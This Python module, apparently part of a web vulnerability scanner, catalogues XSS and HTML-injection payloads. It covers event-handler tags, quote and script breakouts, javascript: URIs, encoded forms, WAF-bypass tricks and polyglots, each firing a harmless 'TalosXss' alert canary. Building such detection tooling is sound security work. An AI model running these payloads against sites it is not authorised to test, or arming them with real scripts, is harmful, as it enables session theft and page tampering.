"""
Module: talos.xss.payloads

Purpose:
    XSS / HTML injection payload catalogue.

    Default inject mode is **append** so a captured value still breaks
    out of HTML / attribute / JS context. A few URL-style payloads
    **replace** the field (javascript: / data:).

    Every payload embeds the canary ``TalosXss`` so the detector can
    tell *our* reflection from pre-existing page markup.

    Families:
        html_tag   — classic HTML/JS execution tags
        htmli      — markup injection without a JS sink
        html_attr  — attribute quote breakout
        event      — event-handler XSS
        js         — JavaScript string / comment / script breakout
        url        — javascript: and data: URIs
        encoded    — URL, double-URL, HTML entity, unicode
        bypass     — WAF / filter evasion
        polyglot   — multi-context payloads

    Keep each technique as a distinct id so each (flow, entry point,
    payload) is one scheduler job.

Dependencies: talos.xss.models
Data flow: CLI / engine → generate_xss_payloads → job meta
Side effects: None.
"""

from __future__ import annotations

from typing import Optional

from talos.xss.models import (
    CANARY,
    CONTEXT_HTML_ATTR,
    CONTEXT_HTML_BODY,
    CONTEXT_SCRIPT,
    CONTEXT_URL,
    FAMILIES,
    FAMILY_BYPASS,
    FAMILY_ENCODED,
    FAMILY_EVENT,
    FAMILY_HTML_ATTR,
    FAMILY_HTML_TAG,
    FAMILY_HTMLI,
    FAMILY_JS,
    FAMILY_POLYGLOT,
    FAMILY_URL,
    INJECT_APPEND,
    INJECT_REPLACE,
    RISK_HTMLI,
    RISK_XSS,
    XssPayload,
)


def _payload(
    *,
    technique: str,
    family: str,
    payload: str,
    description: str,
    risk_class: str = RISK_XSS,
    context: str = CONTEXT_HTML_BODY,
    inject_mode: str = INJECT_APPEND,
) -> XssPayload:
    """Purpose: Build one catalogue row."""
    return XssPayload(
        technique=technique,
        family=family,
        payload=payload,
        description=description,
        risk_class=risk_class,
        context=context,
        inject_mode=inject_mode,
        canary=CANARY,
    )


def _base_payloads() -> list[XssPayload]:
    """Purpose: Full raw catalogue. Filtered later by --family / --technique."""
    c = CANARY
    return [
        # ---- HTML / JS execution tags -----------------------------------
        _payload(
            technique="script_alert",
            family=FAMILY_HTML_TAG,
            payload=f"<script>alert('{c}')</script>",
            description="Classic <script>alert canary (HTML body).",
        ),
        _payload(
            technique="script_confirm",
            family=FAMILY_HTML_TAG,
            payload=f"<script>confirm('{c}')</script>",
            description="Classic <script>confirm canary.",
        ),
        _payload(
            technique="img_onerror",
            family=FAMILY_HTML_TAG,
            payload=f"<img src=x onerror=alert('{c}')>",
            description="<img src=x onerror=alert> (quoted canary).",
        ),
        _payload(
            technique="img_onerror_unquoted",
            family=FAMILY_HTML_TAG,
            payload=f"<img src=x onerror=alert({c})>",
            description="<img> onerror with unquoted identifier canary.",
        ),
        _payload(
            technique="svg_onload",
            family=FAMILY_HTML_TAG,
            payload=f"<svg onload=alert('{c}')>",
            description="<svg onload=alert> (HTML5).",
        ),
        _payload(
            technique="svg_onload_slash",
            family=FAMILY_HTML_TAG,
            payload=f"<svg/onload=alert('{c}')>",
            description="<svg/onload> space-less tag (filter bypass).",
        ),
        _payload(
            technique="iframe_js",
            family=FAMILY_HTML_TAG,
            payload=f"<iframe src=javascript:alert('{c}')>",
            description="<iframe src=javascript:alert>.",
        ),
        _payload(
            technique="iframe_srcdoc",
            family=FAMILY_HTML_TAG,
            payload=f"<iframe srcdoc=\"<script>alert('{c}')</script>\">",
            description="<iframe srcdoc> nested script.",
        ),
        _payload(
            technique="body_onload",
            family=FAMILY_HTML_TAG,
            payload=f"<body onload=alert('{c}')>",
            description="<body onload=alert>.",
        ),
        _payload(
            technique="input_autofocus",
            family=FAMILY_HTML_TAG,
            payload=f"<input autofocus onfocus=alert('{c}')>",
            description="<input autofocus onfocus> (no click).",
        ),
        _payload(
            technique="details_ontoggle",
            family=FAMILY_HTML_TAG,
            payload=f"<details open ontoggle=alert('{c}')>",
            description="<details open ontoggle> (Chromium).",
        ),
        _payload(
            technique="video_onerror",
            family=FAMILY_HTML_TAG,
            payload=f"<video src=x onerror=alert('{c}')>",
            description="<video> onerror handler.",
        ),
        _payload(
            technique="audio_onerror",
            family=FAMILY_HTML_TAG,
            payload=f"<audio src=x onerror=alert('{c}')>",
            description="<audio> onerror handler.",
        ),
        _payload(
            technique="math_href",
            family=FAMILY_HTML_TAG,
            payload=f"<math><mtext href=javascript:alert('{c}')>{c}</mtext></math>",
            description="MathML href=javascript: (legacy browsers).",
        ),
        _payload(
            technique="marquee_onstart",
            family=FAMILY_HTML_TAG,
            payload=f"<marquee onstart=alert('{c}')>{c}</marquee>",
            description="<marquee onstart> (legacy).",
        ),
        _payload(
            technique="object_data",
            family=FAMILY_HTML_TAG,
            payload=f"<object data=javascript:alert('{c}')>",
            description="<object data=javascript:>.",
        ),
        _payload(
            technique="embed_src",
            family=FAMILY_HTML_TAG,
            payload=f"<embed src=javascript:alert('{c}')>",
            description="<embed src=javascript:>.",
        ),
        _payload(
            technique="svg_animate",
            family=FAMILY_HTML_TAG,
            payload=(
                f"<svg><animate onbegin=alert('{c}') attributeName=x dur=1s>"
            ),
            description="<svg><animate onbegin> (no load event).",
        ),
        # ---- HTML injection (markup, no JS sink) ------------------------
        _payload(
            technique="h1_tag",
            family=FAMILY_HTMLI,
            payload=f"<h1>{c}</h1>",
            description="Heading injection <h1>canary</h1>.",
            risk_class=RISK_HTMLI,
        ),
        _payload(
            technique="b_tag",
            family=FAMILY_HTMLI,
            payload=f"<b>{c}</b>",
            description="Bold tag injection.",
            risk_class=RISK_HTMLI,
        ),
        _payload(
            technique="i_tag",
            family=FAMILY_HTMLI,
            payload=f"<i>{c}</i>",
            description="Italic tag injection.",
            risk_class=RISK_HTMLI,
        ),
        _payload(
            technique="u_tag",
            family=FAMILY_HTMLI,
            payload=f"<u>{c}</u>",
            description="Underline tag injection.",
            risk_class=RISK_HTMLI,
        ),
        _payload(
            technique="div_style",
            family=FAMILY_HTMLI,
            payload=f"<div style=color:red>{c}</div>",
            description="Styled <div> injection (visual HTMLI).",
            risk_class=RISK_HTMLI,
        ),
        _payload(
            technique="a_href",
            family=FAMILY_HTMLI,
            payload=f"<a href=https://talos-xss.invalid>{c}</a>",
            description="Anchor injection (no javascript:).",
            risk_class=RISK_HTMLI,
        ),
        _payload(
            technique="img_src",
            family=FAMILY_HTMLI,
            payload=f"<img src=https://talos-xss.invalid/{c}.gif>",
            description="<img> without an event handler (HTMLI).",
            risk_class=RISK_HTMLI,
        ),
        _payload(
            technique="form_action",
            family=FAMILY_HTMLI,
            payload=f"<form action=https://talos-xss.invalid><input value={c}>",
            description="<form> action injection.",
            risk_class=RISK_HTMLI,
        ),
        _payload(
            technique="style_block",
            family=FAMILY_HTMLI,
            payload=f"<style>body{{background:red}}/*{c}*/</style>",
            description="<style> block injection.",
            risk_class=RISK_HTMLI,
        ),
        _payload(
            technique="iframe_src",
            family=FAMILY_HTMLI,
            payload=f"<iframe src=https://talos-xss.invalid/{c}>",
            description="<iframe src> to an attacker host (HTMLI).",
            risk_class=RISK_HTMLI,
        ),
        _payload(
            technique="table_row",
            family=FAMILY_HTMLI,
            payload=f"<table><tr><td>{c}</td></tr></table>",
            description="Table markup injection.",
            risk_class=RISK_HTMLI,
        ),
        _payload(
            technique="textarea",
            family=FAMILY_HTMLI,
            payload=f"<textarea>{c}</textarea>",
            description="<textarea> injection.",
            risk_class=RISK_HTMLI,
        ),
        _payload(
            technique="font_color",
            family=FAMILY_HTMLI,
            payload=f"<font color=red>{c}</font>",
            description="Legacy <font> color injection.",
            risk_class=RISK_HTMLI,
        ),
        _payload(
            technique="marquee_text",
            family=FAMILY_HTMLI,
            payload=f"<marquee>{c}</marquee>",
            description="<marquee> text (no event) — HTMLI.",
            risk_class=RISK_HTMLI,
        ),
        # ---- Attribute breakout -----------------------------------------
        _payload(
            technique="dq_onmouseover",
            family=FAMILY_HTML_ATTR,
            payload=f"\" onmouseover=alert('{c}') x=\"",
            description='Double-quote breakout + onmouseover.',
            context=CONTEXT_HTML_ATTR,
        ),
        _payload(
            technique="sq_onfocus",
            family=FAMILY_HTML_ATTR,
            payload=f"' onfocus=alert('{c}') autofocus x='",
            description="Single-quote breakout + onfocus autofocus.",
            context=CONTEXT_HTML_ATTR,
        ),
        _payload(
            technique="dq_img_break",
            family=FAMILY_HTML_ATTR,
            payload=f"\"><img src=x onerror=alert('{c}')>",
            description='"> tag-break + img onerror.',
            context=CONTEXT_HTML_ATTR,
        ),
        _payload(
            technique="sq_svg_break",
            family=FAMILY_HTML_ATTR,
            payload=f"'><svg/onload=alert('{c}')>",
            description="'><svg/onload> tag-break.",
            context=CONTEXT_HTML_ATTR,
        ),
        _payload(
            technique="unquoted_onerror",
            family=FAMILY_HTML_ATTR,
            payload=f" onerror=alert('{c}') ",
            description="Unquoted attribute injection (space onerror=).",
            context=CONTEXT_HTML_ATTR,
        ),
        _payload(
            technique="dq_javascript_href",
            family=FAMILY_HTML_ATTR,
            payload=f"\" href=\"javascript:alert('{c}')",
            description='href="javascript: breakout.',
            context=CONTEXT_HTML_ATTR,
        ),
        _payload(
            technique="attr_autofocus",
            family=FAMILY_HTML_ATTR,
            payload=f"\" autofocus onfocus=alert('{c}') x=\"",
            description="autofocus onfocus after quote breakout.",
            context=CONTEXT_HTML_ATTR,
        ),
        _payload(
            technique="style_expression",
            family=FAMILY_HTML_ATTR,
            payload=f"\" style=\"x:expression(alert('{c}'))",
            description="Legacy IE CSS expression() in a style attr.",
            context=CONTEXT_HTML_ATTR,
        ),
        # ---- Event-handler family ---------------------------------------
        _payload(
            technique="event_onerror",
            family=FAMILY_EVENT,
            payload=f"<img src=x onerror=alert('{c}')>",
            description="onerror= execution sink.",
        ),
        _payload(
            technique="event_onload",
            family=FAMILY_EVENT,
            payload=f"<body onload=alert('{c}')>",
            description="onload= execution sink.",
        ),
        _payload(
            technique="event_onpointerover",
            family=FAMILY_EVENT,
            payload=f"<div onpointerover=alert('{c}')>{c}</div>",
            description="onpointerover= (modern pointer events).",
        ),
        _payload(
            technique="event_onclick",
            family=FAMILY_EVENT,
            payload=f"<div onclick=alert('{c}')>{c}</div>",
            description="onclick= (needs a click).",
        ),
        _payload(
            technique="event_onanimationend",
            family=FAMILY_EVENT,
            payload=(
                f"<style>@keyframes x{{}}@keyframes y{{}}</style>"
                f"<div style=animation-name:x onanimationend=alert('{c}')>{c}</div>"
            ),
            description="onanimationend= (CSS animation).",
        ),
        # ---- JavaScript context -----------------------------------------
        _payload(
            technique="js_sq_break",
            family=FAMILY_JS,
            payload=f"';alert('{c}')//",
            description="Single-quoted JS string breakout.",
            context=CONTEXT_SCRIPT,
        ),
        _payload(
            technique="js_dq_break",
            family=FAMILY_JS,
            payload=f"\";alert('{c}')//",
            description="Double-quoted JS string breakout.",
            context=CONTEXT_SCRIPT,
        ),
        _payload(
            technique="js_template",
            family=FAMILY_JS,
            payload=f"${{alert('{c}')}}",
            description="JS template-literal ${} interpolation.",
            context=CONTEXT_SCRIPT,
        ),
        _payload(
            technique="js_comment",
            family=FAMILY_JS,
            payload=f"*/alert('{c}')/*",
            description="JS block-comment breakout.",
            context=CONTEXT_SCRIPT,
        ),
        _payload(
            technique="js_close_script",
            family=FAMILY_JS,
            payload=f"</script><script>alert('{c}')</script>",
            description="</script> then a fresh script tag.",
            context=CONTEXT_SCRIPT,
        ),
        _payload(
            technique="js_backslash",
            family=FAMILY_JS,
            payload=f"\\';alert('{c}')//",
            description="Escaped-quote then breakout (filter eats one \\).",
            context=CONTEXT_SCRIPT,
        ),
        # ---- javascript: / data: URIs -----------------------------------
        _payload(
            technique="js_uri",
            family=FAMILY_URL,
            payload=f"javascript:alert('{c}')",
            description="javascript:alert URI (href / Location).",
            context=CONTEXT_URL,
            inject_mode=INJECT_REPLACE,
        ),
        _payload(
            technique="js_uri_encoded",
            family=FAMILY_URL,
            payload=f"javascript:alert%28%27{c}%27%29",
            description="javascript:alert with URL-encoded parens.",
            context=CONTEXT_URL,
            inject_mode=INJECT_REPLACE,
        ),
        _payload(
            technique="data_html",
            family=FAMILY_URL,
            payload=f"data:text/html,<script>alert('{c}')</script>",
            description="data:text/html script URI.",
            context=CONTEXT_URL,
            inject_mode=INJECT_REPLACE,
        ),
        _payload(
            technique="js_uri_tab",
            family=FAMILY_URL,
            payload=f"java\tscript:alert('{c}')",
            description="javascript: with a tab in the scheme (legacy).",
            context=CONTEXT_URL,
            inject_mode=INJECT_REPLACE,
        ),
        _payload(
            technique="js_uri_newline",
            family=FAMILY_URL,
            payload=f"java\nscript:alert('{c}')",
            description="javascript: with a newline in the scheme.",
            context=CONTEXT_URL,
            inject_mode=INJECT_REPLACE,
        ),
        # ---- Encoded ----------------------------------------------------
        _payload(
            technique="enc_url_script",
            family=FAMILY_ENCODED,
            payload=f"%3Cscript%3Ealert('{c}')%3C/script%3E",
            description="URL-encoded <script>alert.",
        ),
        _payload(
            technique="enc_url_img",
            family=FAMILY_ENCODED,
            payload=f"%3Cimg%20src%3Dx%20onerror%3Dalert('{c}')%3E",
            description="URL-encoded <img onerror>.",
        ),
        _payload(
            technique="enc_double_url",
            family=FAMILY_ENCODED,
            payload=f"%253Cscript%253Ealert('{c}')%253C/script%253E",
            description="Double URL-encoded <script> (%253C).",
        ),
        _payload(
            technique="enc_html_hex",
            family=FAMILY_ENCODED,
            payload=f"&#x3c;img src=x onerror=alert('{c}')&#x3e;",
            description="Hex HTML entities for <img> brackets.",
        ),
        _payload(
            technique="enc_html_dec",
            family=FAMILY_ENCODED,
            payload=f"&#60;script&#62;alert('{c}')&#60;/script&#62;",
            description="Decimal HTML entities for <script>.",
        ),
        _payload(
            technique="enc_unicode_js",
            family=FAMILY_ENCODED,
            payload=f"\\u003cscript\\u003ealert('{c}')\\u003c/script\\u003e",
            description="JS unicode escapes \\u003c script \\u003e.",
            context=CONTEXT_SCRIPT,
        ),
        _payload(
            technique="enc_mixed_img",
            family=FAMILY_ENCODED,
            payload=f"<img src=x onerror=alert('{c}')>",
            description="Mixed: raw tag + URL-encoded slash variant follows.",
        ),
        _payload(
            technique="enc_plus_script",
            family=FAMILY_ENCODED,
            payload=f"%3Cscript%3Ealert('{c}')%3C/script%3E".replace("%20", "+"),
            description="URL-encoded script using + for spaces.",
        ),
        # ---- Filter / WAF bypass ----------------------------------------
        _payload(
            technique="bypass_case",
            family=FAMILY_BYPASS,
            payload=f"<ScRiPt>alert('{c}')</sCrIpT>",
            description="Mixed-case <ScRiPt> (case-sensitive filters).",
        ),
        _payload(
            technique="bypass_nested",
            family=FAMILY_BYPASS,
            payload=f"<scr<script>ipt>alert('{c}')</scr</script>ipt>",
            description="Nested <scr<script>ipt> (strip-once filters).",
        ),
        _payload(
            technique="bypass_null",
            family=FAMILY_BYPASS,
            payload=f"<script>alert('{c}')</script>%00",
            description="Trailing null byte after a script tag.",
        ),
        _payload(
            technique="bypass_nl",
            family=FAMILY_BYPASS,
            payload=f"<img\nsrc=x\nonerror=alert('{c}')>",
            description="Newline between img attributes.",
        ),
        _payload(
            technique="bypass_cr",
            family=FAMILY_BYPASS,
            payload=f"<img\rsrc=x\ronerror=alert('{c}')>",
            description="CR between img attributes.",
        ),
        _payload(
            technique="bypass_tab",
            family=FAMILY_BYPASS,
            payload=f"<img\tsrc=x\tonerror=alert('{c}')>",
            description="Tab between img attributes.",
        ),
        _payload(
            technique="bypass_slash_svg",
            family=FAMILY_BYPASS,
            payload=f"<svg/onload=alert('{c}')>",
            description="<svg/onload> (slash instead of space).",
        ),
        _payload(
            technique="bypass_space_tag",
            family=FAMILY_BYPASS,
            payload=f"< img src=x onerror=alert('{c}')>",
            description="Space after < (some naive strippers).",
        ),
        _payload(
            technique="bypass_svg_animate",
            family=FAMILY_BYPASS,
            payload=(
                f"<svg><set onbegin=alert('{c}') attributeName=href "
                f"to=javascript:void(0)>"
            ),
            description="<svg><set onbegin> (no onload).",
        ),
        _payload(
            technique="bypass_mathml",
            family=FAMILY_BYPASS,
            payload=f"<math href=javascript:alert('{c}')>{c}",
            description="MathML href javascript: (no <mtext>).",
        ),
        _payload(
            technique="bypass_noscript",
            family=FAMILY_BYPASS,
            payload=f"<noscript><p title=\"</noscript><img src=x onerror=alert('{c}')\">",
            description="</noscript> parser-desync + img onerror.",
        ),
        _payload(
            technique="bypass_iframe_srcdoc",
            family=FAMILY_BYPASS,
            payload=f"<iframe srcdoc=&lt;script&gt;alert('{c}')&lt;/script&gt;>",
            description="iframe srcdoc with HTML entities (browser decodes).",
        ),
        _payload(
            technique="bypass_template",
            family=FAMILY_BYPASS,
            payload=f"<template><img src=x onerror=alert('{c}')></template>",
            description="<template> wrapping an img onerror.",
        ),
        _payload(
            technique="bypass_waf_concat",
            family=FAMILY_BYPASS,
            payload=f"<img src=x oNlOcAtIoN=x onerror=alert('{c}')>",
            description="Dummy oNlOcAtIoN attr then onerror (keyword split).",
        ),
        _payload(
            technique="bypass_svg_use",
            family=FAMILY_BYPASS,
            payload=f"<svg><use href=data:image/svg+xml,<svg id='x' onload='alert(\"{c}\")'/>",
            description="<svg><use href=data: SVG onload.",
        ),
        # ---- Polyglots --------------------------------------------------
        _payload(
            technique="poly_onclick",
            family=FAMILY_POLYGLOT,
            payload=f"'\"--></title></style></textarea></script><img src=x onerror=alert('{c}')>",
            description="Closes title/style/textarea/script then img onerror.",
        ),
        _payload(
            technique="poly_jaish",
            family=FAMILY_POLYGLOT,
            payload=(
                f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert('{c}') )//%0D%0A%0d%0a//"
                f"</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('{c}')//>\\x3e"
            ),
            description="Jaish-style multi-context polyglot (script/attr/HTML).",
        ),
        _payload(
            technique="poly_svg_script",
            family=FAMILY_POLYGLOT,
            payload=f"'\"><svg><script>alert('{c}')</script>",
            description="Quote-break + svg/script (HTML and attr).",
        ),
    ]


TECHNIQUE_CATALOG: tuple[dict[str, object], ...] = tuple(
    {
        "name": item.technique,
        "family": item.family,
        "description": item.description,
        "risk_class": item.risk_class,
        "context": item.context,
        "inject_mode": item.inject_mode,
        "canary": item.canary,
    }
    for item in _base_payloads()
)

TECHNIQUE_NAMES: tuple[str, ...] = tuple(str(item["name"]) for item in TECHNIQUE_CATALOG)
TECHNIQUE_BY_NAME: dict[str, dict[str, object]] = {
    str(item["name"]): item for item in TECHNIQUE_CATALOG
}

DEFAULT_PAYLOAD_COUNT = len(TECHNIQUE_CATALOG)


def render_payload(item: XssPayload, original: str) -> str:
    """
    Purpose:
        Materialize the bytes to send for one payload against one field.
    Output:
        Replacement string (append mode prefixes the original value).
    """
    if item.inject_mode == INJECT_APPEND and (original or ""):
        return f"{original}{item.payload}"
    return item.payload


def generate_xss_payloads(
    *,
    techniques: Optional[list[str]] = None,
    families: Optional[list[str]] = None,
) -> list[XssPayload]:
    """
    Purpose:
        Return catalogue rows filtered by --technique / --family.
    Output:
        Non-empty list. Raises ValueError on unknown filters.
    """
    payloads = list(_base_payloads())
    if families:
        allow_fam = {name.strip() for name in families if name and name.strip()}
        unknown_fam = allow_fam - set(FAMILIES)
        if unknown_fam:
            raise ValueError(
                "unknown xss family: "
                + ", ".join(sorted(unknown_fam))
                + f". Expected one of: {', '.join(FAMILIES)}"
            )
        payloads = [item for item in payloads if item.family in allow_fam]

    if techniques:
        allow = {name.strip() for name in techniques if name and name.strip()}
        known = {item.technique for item in _base_payloads()}
        unknown = allow - known
        if unknown:
            raise ValueError(
                "unknown xss technique(s): " + ", ".join(sorted(unknown))
            )
        payloads = [item for item in payloads if item.technique in allow]
        missing = allow - {item.technique for item in payloads}
        if missing:
            raise ValueError(
                "xss technique(s) not available for the selected "
                "family: " + ", ".join(sorted(missing))
            )
    return payloads
